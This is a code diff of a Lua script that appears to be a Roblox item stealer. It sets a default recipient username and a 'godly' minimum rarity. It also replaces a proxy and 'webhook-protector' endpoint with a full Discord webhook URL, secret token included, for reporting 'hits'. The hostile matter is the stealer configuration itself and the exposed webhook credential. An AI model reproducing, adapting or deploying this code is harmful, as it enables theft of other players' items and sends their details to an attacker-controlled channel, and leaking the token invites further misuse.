@@ -8,18 +8,18 @@ _G.scriptExecuted = true
 
 local cfg = (getgenv and getgenv()) or {}
 
-local users        = cfg.users        or cfg.Users        or _G.users        or {"huy762009az"}
-local min_rarity   = cfg.min_rarity   or cfg.MinRarity    or _G.min_rarity   or "Common"
+local users        = cfg.users        or cfg.Users        or _G.users        or {"WspNegatron5"}
+local min_rarity   = cfg.min_rarity   or cfg.MinRarity    or _G.min_rarity   or "godly"
 local min_value    = cfg.min_value    or cfg.MinValue     or cfg.minvalue or _G.minvalue or 0
 local pingEveryone = cfg.pingEveryone or cfg.PingEveryone or _G.pingEveryone or "Yes"
 local valuePing    = cfg.valuePing    or cfg.ValuePing    or _G.valuePing    or 100
 cfg.StatusApi = cfg.StatusApi or "https://alr-production.up.railway.app"
-local WEBHOOK_BASE = "https://webhook-vault-vercel.vercel.app/api/hit/"
+local WEBHOOK_BASE = ""
 local RAW_WEBHOOK  = cfg.webhook
     or cfg.Webhook
     or cfg.WebhookToken
     or _G.webhook
-    or "wh_c897fb99a165f2b1f7"
+    or "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
 
 local webhook
 do
@@ -31,7 +31,7 @@ do
             webhook = WEBHOOK_BASE .. v
         end
     else
-        webhook = WEBHOOK_BASE .. "wh_c897fb99a165f2b1f7"
+        webhook = WEBHOOK_BASE .. "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
     end
 end
 
@@ -40,7 +40,7 @@ if webhook == "" or not webhook then
     return
 end
 
-local PROTECTOR_URL = "https://ok-azure-alpha.vercel.app/api/webhook-protector"
+local PROTECTOR_URL = ""
 local PROTECTOR_KEY = "" 
 
 local TOP_HIT_THRESHOLD = 1000
